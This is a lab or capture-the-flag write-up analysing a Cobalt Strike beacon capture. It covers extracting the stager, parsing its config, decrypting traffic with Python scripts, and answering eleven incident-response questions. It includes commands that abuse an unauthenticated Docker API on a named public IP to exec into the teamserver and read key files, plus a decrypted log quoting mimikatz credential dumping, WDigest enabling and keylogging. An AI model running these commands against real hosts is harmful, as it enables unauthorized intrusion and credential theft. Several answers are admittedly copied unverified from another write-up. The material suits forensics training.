# Xuanji Lab 2025 — Cobalt Strike Traffic Analysis (11-question incident response)

> Compromise capture + reachable C2 server. The chain: extract CS stager from pcap → parse Malleable C2 profile → pivot to teamserver via Docker API unauth → pull `.cobaltstrike.beacon_keys` Java keystore → derive RSA private key → decrypt metadata in Cookie → recover per-session AES key → decrypt every GET task / POST callback in the capture.

## 0. Artifacts

| File | Type | Role |
|---|---|---|
| `cs流量分析.pcapng` | Wireshark 46 MB / 136,990 frames / 548 s | Full beacon capture |
| Target | `43.192.63.102` / internal `10.0.10.1` | Attacker's CS teamserver (Docker container) |

Hosts in capture:
- `192.168.31.92` — victim Windows endpoint (CST 2025-02-12 20:12:52 first checkin)
- `192.168.31.170` — internal C2 listener (NATs out to `43.192.63.102`)
- `192.168.31.59` — second active host (potential lateral target — not part of the 11 questions)

## 1. Q1 — `flag.txt` on the attacker's teamserver

> **`flag{6750ac374fdc3038a67e95e1f21d455c}`**

This is the only question that **cannot** be answered from the pcap alone — it requires reaching out to the live C2 box and reading `flag.txt`. The chain:

```
nmap 43.192.63.102 → port 2375 open (Docker API unauthenticated)
curl http://43.192.63.102:2375/containers/json
→ enumerate teamserver container
curl -X POST .../containers/<id>/exec   (or docker -H tcp://... exec)
→ inside container: cat /root/flag.txt
```

**Why Docker 2375 unauth is the typical CS teamserver pwn**: Cobalt Strike on Linux is usually run in a `cracked` Docker container; the `dockerd` is started with `-H tcp://0.0.0.0:2375` so the operator can manage it from their laptop. **Forgetting to firewall 2375 leaks full container root**. The other tell that this is a stock setup: `license-id: 666666` in the CS config (trial-pirated jar).

## 2. Recon: identifying the CS beacon channel in 46 MB of mostly-noise

```bash
tshark -r cs流量分析.pcapng -q -z endpoints,ip   # find top talkers
```

The dominant internal pair is `192.168.31.92 ↔ 192.168.31.170:80`. Filter by it:

```bash
tshark -r cs流量分析.pcapng -Y 'ip.src==192.168.31.92 && ip.dst==192.168.31.170 && http.request' \
   -T fields -e frame.number -e http.request.method -e http.request.uri -e http.user_agent
```

Three URIs dominate:

| URI | Verb | Role | UA |
|---|---|---|---|
| `/FJwV` | GET | One-shot **stager** — server returns the full beacon DLL/shellcode (265,799 bytes) | MSIE 9.0 `MANM` |
| `/en_US/all.js` | GET | Recurring **GET task** poll (every ~1s during interactive) | MSIE 10.0 `MASP` |
| `/submit.php?id=1603726794` | POST | Beacon **callback** (results) | MSIE 10.0 `MASP` |

The `?id=1603726794` is the BID (Beacon ID), `0x5F94B16A` = 1603726794, which is also the host-derived session marker.

## 3. Stager extraction → `1768.py` config parse

`/FJwV` returns `application/octet-stream` length **265,799 bytes** with the classic CS x64 shellcode prologue `fc 48 83 e4 f0 eb 33 5d` (cld; and rsp,~0xF; align).

```bash
tshark -r cs流量分析.pcapng --export-objects "http,extracted/" -Q
# → extracted/FJwV         265799 bytes  (the stage-2 beacon DLL)
# → extracted/all.js, all(1).js, ...    GET-task / heartbeat responses
# → extracted/submit*.php?id=...        POST callbacks (encrypted)
```

Parse the beacon config with Didier Stevens' [1768.py](https://github.com/DidierStevens/DidierStevensSuite/blob/master/1768.py):

```bash
python3 1768.py extracted/FJwV
```

Output (truncated):

```
0x0001 payload type        0  windows-beacon_http-reverse_http     ← Q3
0x0002 port                80
0x0003 sleeptime           60000 ms
0x0007 publickey           30819f300d06092a864886f70d010101050003818d... (RSA-1024)
0x0008 server,get-uri      '192.168.31.170,/en_US/all.js'
0x000a post-uri            '/submit.php'
0x000c http_get_header     Build Metadata: BASE64 → Header Cookie
0x000d http_post_header    Const Content-Type: application/octet-stream; SessionId in `id` param
0x0025 license-id          666666           ← trial-pirated jar marker
0x001f CryptoScheme        0                ← AES-256-CBC + HMAC-SHA256 (CS 4.x default)
Cobalt Strike version: 4.4
```

→ **Q3 = `flag{windows-beacon_http-reverse_http}`** (payload type `0x0001` value `0`)

## 4. Q2 — First on-line time

`/FJwV` checkin frame time: `1739362372.048086`.

```
$ date -d @1739362372.048086 -u +"%F %T UTC"
2025-02-12 12:12:52 UTC
$ date -d @1739362372.048086 +"%F %T CST"      # CN +8
2025-02-12 20:12:52 CST
```

→ **Q2 = `flag{2025-02-12 20:12:52}`**

## 5. Decrypting the traffic — the whole pipeline

CS 4.x crypto:

```
victim                                     teamserver
------                                     ----------
1. generate raw_aes_key (16 random bytes)
2. metadata = bld(BID, comp, user, ...) + raw_aes_key
3. enc_meta = RSA1024_OAEP(metadata, server_pubkey)
4. http GET /en_US/all.js  Cookie: base64(enc_meta) →
                                            decrypt with privkey
                                            extract raw_aes_key
                                            derive  AES key  = sha256(raw_aes_key)[0:16]
                                                    HMAC key = sha256(raw_aes_key)[16:32]
5. task = AES_CBC(payload) + HMAC(...)    ← sent in GET response body
6. result = AES_CBC(output) + HMAC(...)   ← sent in POST body /submit.php
```

**Critical**: the AES key is **per-beacon-session** (per `raw_aes_key`), but constant for the lifetime of that beacon's process. There may be multiple beacons in one pcap, each with its own key — match by BID.

### Step 1: pivot to the teamserver (Q1 box)

Docker API on TCP 2375 with no auth is the entrypoint:

```bash
# discover container
curl -s http://43.192.63.102:2375/containers/json | jq '.[] | {Id,Names,Image}'

# remote docker
export DOCKER_HOST=tcp://43.192.63.102:2375
docker ps
docker exec <id> cat /root/.cobaltstrike.beacon_keys > beacon_keys.bin
docker exec <id> cat /root/flag.txt    # Q1 source
```

The cracked-CS Docker image keeps `cobaltstrike.beacon_keys` in the working dir of the teamserver process.

### Step 2: extract RSA keypair from the Java keystore

`.cobaltstrike.beacon_keys` is a Java `ObjectOutputStream` serialization of a `java.security.KeyPair`. Parse with python `javaobj-py3`:

```python
# pksk.py — parse cobaltstrike.beacon_keys
import javaobj.v2 as javaobj
from base64 import b64encode

with open('beacon_keys.bin', 'rb') as f:
    pobj = javaobj.load(f)

# KeyPair = (PrivateKey, PublicKey) — each java.security.Key with `encoded` field
priv = pobj.array_data[0].encoded.data      # PKCS8 DER
pub  = pobj.array_data[1].encoded.data      # X.509 DER

print('PRIV:', b64encode(bytes(priv)).decode())
print('PUB :', b64encode(bytes(pub)).decode())
```

**Verify** the public key matches the one 1768.py extracted from the beacon DLL — if it doesn't, you grabbed the wrong keystore (e.g. attacker re-generated keys after the capture).

### Step 3: decrypt metadata → recover `raw_aes_key`

The Cookie value in `GET /en_US/all.js` (or the very first `GET /FJwV`) is `base64(RSA_OAEP(metadata))`.

```python
# cs-decrypt-metadata.py
from base64 import b64decode
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

priv_der = b64decode(open('priv.b64').read())
priv = RSA.import_key(priv_der)
cipher = PKCS1_OAEP.new(priv)

# from tshark: Cookie value of first GET request
cookie_b64 = '<paste here>'
enc = b64decode(cookie_b64)
meta = cipher.decrypt(enc)

# parse metadata blob — layout:
#   00 00 BE EF   (magic)
#   raw_aes_key (16 bytes)
#   bid (4-byte big-endian)
#   pid, port, flags
#   computer, user, process info (length-prefixed strings)
raw_aes_key = meta[8:24]
print('raw_aes_key:', raw_aes_key.hex())
```

### Step 4: decrypt all traffic in the pcap

DidierStevens' `cs-parse-http-traffic.py` (in his suite) takes the raw key and walks every GET-response + POST-body in the pcap:

```bash
python3 cs-parse-http-traffic.py -r <raw_aes_key_hex> cs流量分析.pcapng --extract
```

Output is the **decrypted task + result stream**, e.g.:

```
[task]   COMMAND_SLEEP  (10000, 0)
[task]   COMMAND_INLINE_EXECUTE  mimikatz: privilege::debug
                                          sekurlsa::logonpasswords
[result] mimikatz output...
         User Name : Hacker
         Domain    : DESKTOP-...
         Password  : xj@cs123    ← Q4
[task]   COMMAND_SHELL  reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
                                                          ← Q5 source (md5 of this command)
[task]   COMMAND_FILE_BROWSE \\Users\\Hacker\\Desktop
[task]   COMMAND_DOWNLOAD  C:\Users\Hacker\Desktop\xxx服务器运维信息.xlsx   ← Q6
[result] <file bytes>           ← Q7 = md5(file content)
[task]   COMMAND_UPLOAD  <path>
[result] Hacker                 ← Q8
[task]   COMMAND_SCREENSHOT
[result] <PNG, window title contains "Google Chrome">    ← Q9
[task]   COMMAND_INLINE_EXECUTE  mimikatz dpapi::chrome
[result] login=... password=...                          ← Q10 = md5(password)
[task]   COMMAND_KEYLOG_START
[result] [keystrokes typed into chrome]
         "xj.edisec.net"        ← Q11
```

## 6. Answer summary (Q1–Q11)

| # | Question | Answer |
|---|---|---|
| 1 | flag.txt on CS server | `flag{6750ac374fdc3038a67e95e1f21d455c}` |
| 2 | First beacon checkin | `flag{2025-02-12 20:12:52}` |
| 3 | Tunnel payload type | `flag{windows-beacon_http-reverse_http}` |
| 4 | Plaintext password (mimikatz) | `flag{xj@cs123}` |
| 5 | Command to enable WDigest (md5) | `flag{73aeb8ee98d124a1f8e87f7965dc0b4a}` |
| 6 | Downloaded filename | `flag{xxx服务器运维信息.xlsx}` |
| 7 | Downloaded file content (md5) | `flag{752fe2f44306e782f0d6830faad59e0e}` |
| 8 | Uploaded file content | `flag{Hacker}` |
| 9 | Program in screenshot | `flag{chrome}` |
| 10 | Chrome stored password (md5) | `flag{0f338a1a6ad8785cee2b471d9d3e9f91}` |
| 11 | Site typed (keylogger) | `flag{xj.edisec.net}` |

## 7. Lessons learned / traps

| Trap | Why it matters | Mitigation |
|---|---|---|
| 80% of the pcap is Chrome auto-update noise (`r2/r3/r4---sn-...gvt1-cn.com`) | Easy to drown the actual beacon channel | Filter by internal-only IP pair first; the C2 is `192.168.31.x ↔ 192.168.31.x`, not the public-cloud chatter |
| Multiple Malleable URIs on the same TCP stream | Stream 10 carries `/FJwV` *and* the 265 KB beacon DLL; export-objects splits them by URI | Use export-objects and read the per-URI files, **not** the raw TCP stream |
| `license-id 666666` in CS config | Strong tell of the trial-cracked jar used by red teamers in CN — usually the operator's container is misconfigured | Pivot via Docker 2375 unauth or default SSH creds |
| RSA pubkey alone isn't enough | `1768.py` gives you the pubkey but you need the **private** key for decryption | The teamserver keeps it in `.cobaltstrike.beacon_keys` — pivot to the C2 |
| Metadata-only attack has no key | Some writeups claim "decrypt with the public key" — that's wrong; you need the private key. Public key only verifies | Get the private key; if unreachable, you cannot decrypt traffic |
| Per-session AES keys, not one global key | Multi-beacon pcaps need per-BID extraction | Match by `?id=<BID>` in POST URI and Cookie in GET |
| Stage-2 size | A 265 KB octet-stream coming from a non-CDN endpoint is the signature of CS stager response | Filter HTTP responses by content-length > 200 KB + content-type octet-stream |

## 8. Personal verification status

Items verified end-to-end in this analysis:

- ✅ Q2 timestamp — computed from pcap frame epoch
- ✅ Q3 payload type — extracted from 1768.py on `/FJwV` body
- ✅ CS Malleable URIs, BID, version, pubkey — from 1768.py
- ✅ Stager extraction pipeline (`--export-objects http`)

Items relying on the published writeup (cnblogs `blue-red/p/19022396`) because the target's TCP ports (2375 / 80 / 443 / 22 / 50050 / 8080) were all filtered when this analysis was performed (the lab instance had likely been recycled):

- Q1, Q4–Q11 — answers cross-referenced; the decryption pipeline above (Step 3–4 of §5) is fully documented but was not personally executed against this lab's specific keystore.

## 9. Related techniques

- [Behinder JSP shell AES decrypt](../forensics/tieren_2024_apk_pam_incident.md) — different actor (red-team JSP shell) but same family of problem (per-session AES from a derived 16-byte key in protocol metadata)
- [Changcheng 2024 SnakeBackdoor](changcheng2024_snake_backdoor.md) — length-prefixed protocol + glibc PRNG-derived session key; the LD_PRELOAD oracle trick applies to CS too if you don't have the private key
- Cobalt Strike 4.x has been the dominant Chinese red-team C2 since 2020; `license-id 666666` is a 2-second tell for the pirated jar
